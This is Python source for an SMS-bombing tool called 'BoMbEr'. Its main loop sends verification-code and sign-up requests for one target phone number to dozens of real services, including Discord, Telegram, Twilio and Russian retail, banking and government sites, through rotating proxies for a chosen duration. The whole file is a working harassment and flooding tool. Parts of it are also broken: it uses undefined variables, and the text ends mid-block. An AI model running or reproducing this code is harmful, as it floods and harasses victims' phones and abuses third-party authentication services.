# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#---------------------------------------(sms)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from threading import Thread
from functools import reduce
from requests import get, post
from os.path import exists, isfile
from random import choice, randint
from colorama import Fore, Back, Style, init

colorama.init()

def sms(prx, number, tm, code):

	header = {
		"Content-Type": "application/json"
	}
	
	try:
		if prx == 'yes':

			proxy = []
			t = time.monotonic()

			with open(r"proxies.txt", "r", encoding="utf-8") as file:
				for line in file:
					proxy.append(line)

			proxy = [line.rstrip() for line in proxy]

			while time.monotonic() - t < tm:

				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}

				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"u": "U"
					}
					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://auth.easypay.ua/api/check", json = payload, proxies = proxies)
				except:
					pass

				try:
					header = {
						"accept": "application/json, text/plain, */*",
						"accept-encoding": "gzip, deflate, br",
						"accept-language": "en",
						"content-length": "60",
						"content-type": "application/json",
						"dnt": "1",
						"origin": "https://wheely.com",
						"referer": "https://wheely.com/",
						"sec-ch-ua": 'Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
						"sec-ch-ua-mobile": "?0",
						"sec-ch-ua-platform": "Windows",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "same-site",
						"sec-gpc": "1",
						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
					}

					payload = {"app_id":"55e085968a5da59241000001","phone":"+"+number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", json=payload, headers=header, proxies = proxies)
				except:
					pass

				try:
					header = {
						"Accept": "*/*",
						"Accept-Encoding": "gzip, deflate, br",
						"Accept-Language": "en-US,en;q=0.9",
						"Connection": "keep-alive",
						"Content-Length": "23",
						"Content-Type": "application/json; charset=utf-8",
						"Cookie": "ANALYTICS_UUID=0f11c8f8-2a1d-4aa8-ac9e-14375762326f; POCHTA_LANGUAGE=ru_RU; cdmdtr=eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDIwMTIyNjcsInN1YiI6IkZpbmdlclByaW50VG9rZW4iLCJ0b2tlbklkIjoiNzY4MzA4OWEtNTNiMi00MDBiLWIwOTYtNjUzZTNlZDBiNDlhIiwiY3JlYXRpb25EYXRlIjoiMTYzOTkxMjI2NzE3OSJ9.hzSMPyIaRhHrN8-IXyp1jLGb6RsJVorUtLLd6cuHhpU; jact=e407ecc92b3d9d89026c19c44aa64f1e2dfbf9c6; act=29252fc6-a8d4-4864-953d-67d555d84bd9; sct=9a4a1bdc-88e9-44f6-b284-8c00213f9d75",
						"dnt": "1",
						"Host": "passport.pochta.ru",
						"Origin": "https://passport.pochta.ru",
						"Referer": "https://passport.pochta.ru/pc/ext/v2.0/form/signUp?callbackurl=https%3A%2F%2Fpassport.pochta.ru%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26scope%3Dopenid%2Bemail%26partyType%3DPHYSICAL%26registration%3Dfalse%26client_id%3Dh9ING4sB_FjPBzNgtuUCeWrSQA8a%26redirect_uri%3Dhttps%253A%252F%252Fwww.pochta.ru%252Fc%252Flogin%252Fpost_id_callback%26group%3Dportal%26lang%3Dru&display=page&dm=l",
						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
						"sec-ch-ua-mobile": "?0",
						"sec-ch-ua-platform": "Windows",
						"Sec-Fetch-Dest": "empty",
						"Sec-Fetch-Mode": "cors",
						"Sec-Fetch-Site": "same-origin",
						"sec-gpc": "1",
						"User-Agent": 'Moz"illa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)'
						}
					payload = {"phone":number,"resend":False,"display":"page","dm":"l"}
					requests.post("https://passport.pochta.ru/pc/ext/v2.0/signUp/phone/request", headers=header, json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"fio":"",
						"password":"2342uirejhwfr",
						"email":"",
						"emailAdvertAccepted":True,
						"phoneNumber":"+"+number,
						"webReferrer":"https://www.fonbet.ru/",
						"advertInfo":"",
						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
						"promoId":"",
						"ecupis":True,
						"birthday":"2000-12-12",
						"sysId":1,
						"lang":"ru",
						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
					}
					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"CountryCodeNumber": "+" + number[1:], 
						"IsoCountryCode": "RU", 
						"PhoneNumber": f"+{number}"
					}
					requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"landing": "loyalty",
						"phone": number
					}
					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=' '
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phoneNumber": num2,
						"lang": "ru",
						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
						"source": "showScreenSet",
						"sdk": "js_latest",
						"authMode": "cookie",
						"pageURL": "https://mega.ru/",
						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
						"sdkBuild": 12563,
						"format": "json"
					}
					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"change_phone_reason": "user_action_required",
						"phone": f"+{number}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", json = payload, proxies = proxies)
				except:
					pass

				try:
					num = number

					num2+=num[1]
					num2+=num[2]
					num2+=num[3]

					num3+=num[4]
					num3+=num[5]
					num3+=num[6]

					num4+=num[7]
					num4+=num[8]

					num5+=num[9]
					num5+=num[10]
					payload = {
						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')}, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone":number,"invite":""}
					requests.post("https://burgerking.ru/api-web-front/api/v3/auth/signup", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"password":"","login":number}
					requests.post("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number[1:]}
					requests.post("https://backend.academyopen.ru/api-7/otp-code/send", json=payload, proxies=proxies)
				except:
					pass

				try:
					requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{number}", json=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+="-"
					num2+=num[7]
					num2+=num[8]
					num2+="-"
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"register": "true"
					}
					requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {
						"phone_number": number[1:],
						"country_code": "US"
					}
					requests.post("https://app.snapchat.com/stories_everywhere/download_sms?", data=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {"phone":num2,"force_sms":"true"}
					requests.post("https://api.eapteka.ru/api/v3/user", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number, "action": "register"}
					requests.post("https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {
						"phone": number[1:],
						"bxsid": "c077215a7749df2949ed967377de77ca",
						"sms1": "Y",
						"typeAction": "regUser"
					}
					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+"+number}
					requests.post("https://youla.ru/web-api/auth/request_code", data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://b-apteka.ru/lk/send_confirm_code", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num3=""
					num3+=num[4]
					num3+=num[5]
					num3+=num[6]
					num4=""
					num4+=num[7]
					num4+=num[8]
					num5=""
					num5+=num[9]
					num5+=num[10]
					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y", proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload, proxies = proxies)
				except:
					pass

				try:
					header = {
						"Accept": "*/*",
						"Accept-Encoding": "gzip, deflate, br",
						"Accept-Language": "en-US,en;q=0.9",
						"Connection": "keep-alive",
						"Content-Length": "23",
						"Content-Type": "application/json; charset=utf-8",
						"Cookie": "ANALYTICS_UUID=0f11c8f8-2a1d-4aa8-ac9e-14375762326f; POCHTA_LANGUAGE=ru_RU; cdmdtr=eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDIwMTIyNjcsInN1YiI6IkZpbmdlclByaW50VG9rZW4iLCJ0b2tlbklkIjoiNzY4MzA4OWEtNTNiMi00MDBiLWIwOTYtNjUzZTNlZDBiNDlhIiwiY3JlYXRpb25EYXRlIjoiMTYzOTkxMjI2NzE3OSJ9.hzSMPyIaRhHrN8-IXyp1jLGb6RsJVorUtLLd6cuHhpU; jact=e407ecc92b3d9d89026c19c44aa64f1e2dfbf9c6; act=29252fc6-a8d4-4864-953d-67d555d84bd9; sct=9a4a1bdc-88e9-44f6-b284-8c00213f9d75",
						"dnt": "1",
						"Host": "passport.pochta.ru",
						"Origin": "https://passport.pochta.ru",
						"Referer": "https://passport.pochta.ru/pc/ext/v2.0/form/signUp?callbackurl=https%3A%2F%2Fpassport.pochta.ru%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26scope%3Dopenid%2Bemail%26partyType%3DPHYSICAL%26registration%3Dfalse%26client_id%3Dh9ING4sB_FjPBzNgtuUCeWrSQA8a%26redirect_uri%3Dhttps%253A%252F%252Fwww.pochta.ru%252Fc%252Flogin%252Fpost_id_callback%26group%3Dportal%26lang%3Dru&display=page&dm=l",
						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
						"sec-ch-ua-mobile": "?0",
						"sec-ch-ua-platform": "Windows",
						"Sec-Fetch-Dest": "empty",
						"Sec-Fetch-Mode": "cors",
						"Sec-Fetch-Site": "same-origin",
						"sec-gpc": "1",
						"User-Agent": 'Moz"illa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)'
						}
					payload = {"phone":number,"resend":False,"display":"page","dm":"l"}
					requests.post("https://passport.pochta.ru/pc/ext/v2.0/signUp/phone/request", headers=header, json=payload)
				except:
					pass

				try:
					requests.get(f"https://login.aliexpress.ru/join/PreCheckForPhoneRegister.htm?cellPhone=7-{number[1:]}&umidToken=defaultToken4_init_failed+with+failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611333739&ua=%5Bobject+Promise%5D&registerFrom=AE_MAIN_REGISTER&bx-ua=217!EBGGYGznGz4eN2CgjdZGf6a0AmrKrOl2p03jjsrNDiBNgnZ6%2BGOgMemXLpdDex%2B8bcbiv9J1EKDgjsZB6SozsTHfNLcUEZjAFa4u20iIbSfSnsXM%2BcyXfG2fGdi6vO91G2YYGAreoEZ1UwR4wOuBv9MT%2FJNfkb9GZ2Yx8WM5ClG1LwRARbWB1UGh%2FkzFvjWGp2qq8KYBC0GGLw%2F4kVWBpjPyfZxbv0r4EtqqLOGz200a%2Fk0js2gW6HgNl30HqTEz%2BR0XqDTbnJmq0Qqpj6xuSxPNz30cKsOK%2Bq0EiA5EnIDU0JaMT2NweM3qT0FyHQd530qIwOrRqxWfMt8wldlOo1gxVw7h209aAdxK%2Ft13zPPU04upCmFt3i37%2B0pZzela6HsIqikwaD9jR28ppmFEuiFNs0pcHrWf6K0hqVybUFmKwDwejl99ogP2lK7y5Y0J3RatOk5F5cF5Y43URvEUpGGh%2Fk815V%2FlDDuhOEGRqNn564wPFThkrr3szGauSS5Ur9p9GA5DS9ufLYObiSvBGMG3%2FkR0C4WGG2zx8KqB5iqYqHqBODddbxgPeJ8gK385o1dtOEFOJ0FVLx7JZ%2BmBZGMygEs%2FvCX1GTP2c%2BQ2LdPl8TRLOH6wWkdoksCCaq7jB%2FVXpBDUUC3UOK5ShqDAjnSLWcY8S6gKsi5uF60dq53tgLd0x7GqmuwXCGpKpGVQ6II2JT0lsWI2QgmVbUERLbZIWOnWfltLFj%2FM8Sxh8%2FSTH6lbDflM70ldQCJvQN74imTWA1PN4l6cNw5P8msgHpF%2B7WJBNuezdcEt5CdOw0jicbTPjNpwQnkVIrEOxeD9ALTlG%2FV2OzSAGe2CC9QTRpRVUxYBsgYkaRKG2Nxg3eN29DDo%2FLARMubD2%2B4TtlUzA75%2BhDMM7VamEozoEUgHVUVk3yqFlLjViFGpU1yIbv%2BSkCzqwB8Qr97tYmk2AlFV%2BgLAzHZH9ffexVagYRLocsDojL9oBtnxYMPE8xSc4A2dgTiKfQaxv6q3bcxNPlplRp%2FGyvdoeinAxjCg%2Bi1IB6%2BQ3PmWUYbe1cHUKXfsSmksXpstOwjSYwm4vtxIxztG31cmu93BC0Z5ep5a03HbCanIp3mP%2BRMU%2FllzqkG0FTPOslgBucamTHJ14Imj%2FHrtUAMb437nAdmuK85wGWBU3zx6xdAgAXbf30%3D%3D&bx-umidtoken=defaultToken4_init_failed%20with%20failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611336744&_bx-v=2.0.39", proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phoneNumber": f"+{number}"
					}
					requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload, proxies = proxies)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number}, proxies = proxies)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header, proxies = proxies)
				except:
					pass

		elif prx == 'no':
			t = time.monotonic()

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://auth.easypay.ua/api/check", json = payload)
				except:
					pass

				try:
					payload = {"phone": "+"+number}
					requests.post("https://youla.ru/web-api/auth/request_code", data=payload)
				except:
					pass

				try:
					header = {
						"accept": "application/json, text/plain, */*",
						"accept-encoding": "gzip, deflate, br",
						"accept-language": "en",
						"content-length": "60",
						"content-type": "application/json",
						"dnt": "1",
						"origin": "https://wheely.com",
						"referer": "https://wheely.com/",
						"sec-ch-ua": 'Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
						"sec-ch-ua-mobile": "?0",
						"sec-ch-ua-platform": "Windows",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "same-site",
						"sec-gpc": "1",
						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
					}

					payload = {"app_id":"55e085968a5da59241000001","phone":"+"+number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", json=payload, headers=header)
				except:
					pass

				try:
					payload = {
						"CountryCodeNumber": "+" + number[1:], 
						"IsoCountryCode": "RU", 
						"PhoneNumber": f"+{number}"
					}
					requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://b-apteka.ru/lk/send_confirm_code", json=payload)
				except:
					pass

				try:
					requests.get(f"https://login.aliexpress.ru/join/PreCheckForPhoneRegister.htm?cellPhone=7-{number[1:]}&umidToken=defaultToken4_init_failed+with+failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611333739&ua=%5Bobject+Promise%5D&registerFrom=AE_MAIN_REGISTER&bx-ua=217!EBGGYGznGz4eN2CgjdZGf6a0AmrKrOl2p03jjsrNDiBNgnZ6%2BGOgMemXLpdDex%2B8bcbiv9J1EKDgjsZB6SozsTHfNLcUEZjAFa4u20iIbSfSnsXM%2BcyXfG2fGdi6vO91G2YYGAreoEZ1UwR4wOuBv9MT%2FJNfkb9GZ2Yx8WM5ClG1LwRARbWB1UGh%2FkzFvjWGp2qq8KYBC0GGLw%2F4kVWBpjPyfZxbv0r4EtqqLOGz200a%2Fk0js2gW6HgNl30HqTEz%2BR0XqDTbnJmq0Qqpj6xuSxPNz30cKsOK%2Bq0EiA5EnIDU0JaMT2NweM3qT0FyHQd530qIwOrRqxWfMt8wldlOo1gxVw7h209aAdxK%2Ft13zPPU04upCmFt3i37%2B0pZzela6HsIqikwaD9jR28ppmFEuiFNs0pcHrWf6K0hqVybUFmKwDwejl99ogP2lK7y5Y0J3RatOk5F5cF5Y43URvEUpGGh%2Fk815V%2FlDDuhOEGRqNn564wPFThkrr3szGauSS5Ur9p9GA5DS9ufLYObiSvBGMG3%2FkR0C4WGG2zx8KqB5iqYqHqBODddbxgPeJ8gK385o1dtOEFOJ0FVLx7JZ%2BmBZGMygEs%2FvCX1GTP2c%2BQ2LdPl8TRLOH6wWkdoksCCaq7jB%2FVXpBDUUC3UOK5ShqDAjnSLWcY8S6gKsi5uF60dq53tgLd0x7GqmuwXCGpKpGVQ6II2JT0lsWI2QgmVbUERLbZIWOnWfltLFj%2FM8Sxh8%2FSTH6lbDflM70ldQCJvQN74imTWA1PN4l6cNw5P8msgHpF%2B7WJBNuezdcEt5CdOw0jicbTPjNpwQnkVIrEOxeD9ALTlG%2FV2OzSAGe2CC9QTRpRVUxYBsgYkaRKG2Nxg3eN29DDo%2FLARMubD2%2B4TtlUzA75%2BhDMM7VamEozoEUgHVUVk3yqFlLjViFGpU1yIbv%2BSkCzqwB8Qr97tYmk2AlFV%2BgLAzHZH9ffexVagYRLocsDojL9oBtnxYMPE8xSc4A2dgTiKfQaxv6q3bcxNPlplRp%2FGyvdoeinAxjCg%2Bi1IB6%2BQ3PmWUYbe1cHUKXfsSmksXpstOwjSYwm4vtxIxztG31cmu93BC0Z5ep5a03HbCanIp3mP%2BRMU%2FllzqkG0FTPOslgBucamTHJ14Imj%2FHrtUAMb437nAdmuK85wGWBU3zx6xdAgAXbf30%3D%3D&bx-umidtoken=defaultToken4_init_failed%20with%20failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611336744&_bx-v=2.0.39")
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {"phone":num2,"force_sms":"true"}
					requests.post("https://api.eapteka.ru/api/v3/user", json=payload)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header)
				except:
					pass

				try:
					num = number

					num2+=num[1]
					num2+=num[2]
					num2+=num[3]

					num3+=num[4]
					num3+=num[5]
					num3+=num[6]

					num4+=num[7]
					num4+=num[8]

					num5+=num[9]
					num5+=num[10]
					payload = {
						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload)
				except:
					pass

				try:
					payload = {
						"phone": number[1:],
						"bxsid": "c077215a7749df2949ed967377de77ca",
						"sms1": "Y",
						"typeAction": "regUser"
					}
					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload)
				except:
					pass

				try:
					payload = {
						"landing": "loyalty",
						"phone": number
					}
					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
				except:
					pass

				try:
